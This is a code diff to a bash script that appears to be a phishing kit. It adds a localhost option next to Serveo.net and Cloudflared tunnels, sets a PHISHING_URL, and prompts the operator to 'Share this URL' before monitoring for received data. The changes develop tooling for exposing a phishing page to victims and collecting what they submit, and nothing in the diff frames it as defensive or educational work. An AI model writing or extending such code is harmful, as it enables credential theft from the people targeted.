@@ -193,13 +193,18 @@ select_tunnel() {
     echo -e "${YELLOW}[+] Select a tunnel:${RESET}"
     echo -e "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m ${BLUE}Serveo.net${RESET}"
     echo -e "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m ${BLUE}Cloudflared${RESET}"
-    echo -ne "${GREEN}[+] Enter choice (1 or 2):${RESET} "
-    read  choice
+    echo -e "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m ${BLUE}Localhost${RESET}"
+
+    echo -ne "${GREEN}[+] Enter choice (1, 2 or 3):${RESET} "
+    read choice
 
     case $choice in
         1) TUNNEL_CHOICE="serveo" ;;
         2) TUNNEL_CHOICE="cloudflared" ;;
-        *) echo -e "${RED}[-] Invalid choice! Defaulting to Serveo.net.${RESET}"; TUNNEL_CHOICE="serveo" ;;
+        3) TUNNEL_CHOICE="localhost" ;;
+        *) echo -e "${RED}[-] Invalid choice! Defaulting to Serveo.net.${RESET}"
+           TUNNEL_CHOICE="serveo"
+        ;;
     esac
 }
 
@@ -244,6 +249,20 @@ start_cloudflared() {
     echo -e "${RED}[-] Cloudflared failed to start!${RESET}"
     stop_server
     exit 1
+}
+
+start_localhost() {
+
+    PHISHING_URL="http://localhost:$SERVER_PORT"
+
+    echo -e "${GREEN}[+] Localhost server running!${RESET}"
+    echo -e "${CYAN}[+] Server Port : ${SERVER_PORT}${RESET}"
+    echo -e "${GREEN}[+] Local Testing URL:${RESET}"
+    echo -e "${CYAN}${PHISHING_URL}${RESET}"
+
+    echo
+    echo -e "${YELLOW}[+] If using VPS or external tunnel, forward this port:${RESET}"
+    echo -e "${CYAN}localhost:${SERVER_PORT}${RESET}"
 }
 
 # Monitor for Received Data
@@ -463,11 +482,16 @@ select_tunnel
 
 if [[ "$TUNNEL_CHOICE" == "serveo" ]]; then
     start_serveo
-else
+elif [[ "$TUNNEL_CHOICE" == "cloudflared" ]]; then
     start_cloudflared
+else
+    start_localhost
 fi
 
-echo -e "\n${CYAN}[+] Share this URL: ${PHISHING_URL}${RESET}"
+if [[ "$TUNNEL_CHOICE" != "localhost" ]]; then
+    echo -e "\n${CYAN}[+] Share this URL: ${PHISHING_URL}${RESET}"
+fi
+
 echo -e "${YELLOW}[+] Press Ctrl+C to stop${RESET}\n"
 
 monitor_data
